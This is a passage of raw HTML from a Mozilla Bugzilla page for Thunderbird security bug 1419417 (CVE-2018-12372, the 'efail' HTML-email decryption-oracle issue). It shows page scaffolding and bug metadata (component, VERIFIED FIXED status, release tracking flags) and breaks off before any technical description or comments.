<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1419417 - (CVE-2018-12372) [efail] S/MIME and PGP decryption oracles can be built with HTML emails">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1419417">
<meta property="og:description"
      content="VERIFIED (jorgk-bmo) in Thunderbird - Security. Last updated 2020-02-16.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="--">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1419417 - (CVE-2018-12372) [efail] S/MIME and PGP decryption oracles can be built with HTML emails</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1419417&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1419417">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1419417">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/yui.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/global.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/util.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"types\":[\"tracking\"],\"flags\":{\"tracking\":{\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_status_thunderbird_61\":\"wontfix\",\"cf_status_thunderbird_93\":\"---\",\"cf_status_thunderbird_60\":\"fixed\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_tracking_thunderbird_95\":\"---\",\"cf_status_thunderbird_esr52\":\"fixed\",\"cf_status_thunderbird_95\":\"---\",\"cf_status_thunderbird_94\":\"---\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_tracking_thunderbird_94\":\"---\",\"cf_status_thunderbird_esr60\":\"fixed\",\"cf_tracking_thunderbird_93\":\"---\",\"cf_status_thunderbird_62\":\"fixed\"}},\"comments\":{}}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1419417;
  BUGZILLA.bug_title = '1419417 - (CVE-2018-12372) [efail] S\/MIME and PGP decryption oracles can be built with HTML emails';
  BUGZILLA.bug_summary = '[efail] S\/MIME and PGP decryption oracles can be built with HTML emails';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1419417';
  BUGZILLA.bug_keywords = 'sec-high',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/field.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/comments.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="vGU7zfNBq8Gvi0wMTd4k1eQ29XQHTbb31bx13vHE7BlxWJEt" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1419417">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1419417"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1419417 - (CVE-2018-12372) [efail] S/MIME and PGP decryption oracles can be built with HTML emails">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="nY7QPvhLiUF9NBFChqnpbUk89coEe5sL16l8v1hY0nmeXw7GJALIRiF29UkIlI6tztnZLk6WWQ6ywlPR4g6omGuzec48prXuk6ZWv1vDlLB0OS0MB9cu4HtuBxio9DRuo0sJ31am4llJ24zHXzN381PH0MdfLvtDv2n69VlvowoSEZg8pTrPgUSgpqJr7DtWx6rU9CCNaoZyAVpml3za6raDgMnjFESMyVeKbNJ68y5sViJX0ow1S12ixVWd7oEr">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1419417" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623261-eZQjz4UGIu4LoWk1-U5C2qUWxlNBRiD_MFtRf4Exd2M">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1419417" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1419417" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1419417">Bug 1419417</a>
          <span class="edit-hide">(CVE-2018-12372)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2017-11-21 06:34 PST" data-time="1511274891">4 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2018-05-23 11:02 PDT" data-time="1527098558">4 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">[efail] S/MIME and PGP decryption oracles can be built with HTML emails</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            [efail] S/MIME and PGP decryption oracles can be built with HTML emails

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Thunderbird :: Security, defect)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Thunderbird" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Thunderbird
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Thunderbird</div>
            <div class="description">For bugs in the Thunderbird mail client front-end. Bugs in the back-end (e.g. protocols) should be filed under MailNews Core. Bugs in Thunderbird's built in calendar and chat features should be filed in the Calendar or Chat components respectively.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Thunderbird&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Thunderbird"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Thunderbird"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Thunderbird&component=Security#Security" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Security
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Thunderbird :: Security</div>
            <div class="description">For app-level security bugs.
<p>
If the problem relates to underlying components (PSM, NSS, Core, Toolkit) then please file it in the appropriate product instead of here.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Thunderbird&amp;component=Security&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Thunderbird&amp;component=Security&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Thunderbird&amp;component=Security"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Thunderbird" data-component="Security"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-version"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            52 Branch

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">
          <em>Not set</em>
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            normal

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (thunderbird_esr52 fixed, thunderbird_esr60 fixed, thunderbird60 fixed, thunderbird61 wontfix, thunderbird62 fixed)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">VERIFIED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            VERIFIED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            Thunderbird 62.0

        </span>
    </div>

  
</div>

    


</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">thunderbird_esr52</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_thunderbird_esr52&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">thunderbird_esr60</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">thunderbird60</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_thunderbird_60&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">thunderbird61</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">thunderbird62</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_thunderbird_62&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr52</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr52-dirty">
  <select id="cf_status_thunderbird_esr52" name="cf_status_thunderbird_esr52">
        <option value="fixed"
          id="v3090_cf_status_thunderbird_esr52" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr60</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr60-dirty">
  <select id="cf_status_thunderbird_esr60" name="cf_status_thunderbird_esr60">
        <option value="fixed"
          id="v3777_cf_status_thunderbird_esr60" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
